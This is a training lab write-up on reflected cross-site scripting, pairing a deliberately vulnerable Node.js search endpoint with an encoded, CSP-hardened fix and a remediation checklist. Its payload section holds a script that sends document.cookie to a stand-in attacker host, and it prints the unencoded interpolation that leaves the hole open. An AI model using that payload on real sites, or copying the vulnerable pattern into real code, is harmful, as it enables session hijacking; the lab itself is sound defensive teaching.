# Lab 02 — Reflected Cross-Site Scripting (XSS)

## What it is

Reflected XSS is what happens when a web endpoint takes user input and
echoes it back into the response HTML without encoding. Attackers craft
URLs that, when clicked, run attacker-controlled JavaScript in the
victim's session.

OWASP **A03:2021 — Injection**.

## The vulnerable code (`vulnerable.js`)

```js
return `<p>You searched for: <strong>${query}</strong></p>`;
```

`query` flows directly from `req.url.searchParams.get('q')` into the
HTML response.

## The payload

```
GET /search?q=<script>fetch('//attacker.test/?c='+document.cookie)</script>
```

In a browser this would execute the script. The test harness (lab 02)
uses `alert(1)` only because headless tests can't trigger a browser
dialog, and we want to keep the proof self-contained.

## Confirming the bug

```bash
node vulnerable.js &
curl -s 'http://127.0.0.1:4201/search?q=<script>alert(1)</script>'
# → <p>You searched for: <strong><script>alert(1)</script></strong></p>
```

## The secure code (`secure.js`)

1. **HTML-encodes** every untrusted value before interpolation.
2. Adds `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'`.
3. Adds `X-Content-Type-Options: nosniff`.

```js
function encode(s) {
  return String(s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;')
    .replace(/>/g, '&gt;').replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
```

## Confirming the fix

```bash
node secure.js &
curl -s 'http://127.0.0.1:4202/search?q=<script>alert(1)</script>'
# → <p>You searched for: <strong>&lt;script&gt;alert(1)&lt;/script&gt;</strong></p>
```

The raw `<script>` is gone — the response now contains the literal text
"&lt;script&gt;".

## Remediation checklist

- [x] Encode on output, not (only) on input — server-side.
- [x] Set a strict CSP.
- [x] Set `X-Content-Type-Options: nosniff`.
- [ ] Prefer templating engines that auto-escape by default
      (e.g. React, Vue, Svelte, Jinja2 with autoescape on).
- [ ] Use a contextual output encoding matrix: HTML, attribute, JS,
      URL, CSS contexts each need different escaping.
- [ ] Audit URL parameters and any user-supplied JSON / XML body fields.

## Ethics

Use these lab servers only on `127.0.0.1`. Never test XSS against
production systems without explicit written authorization.
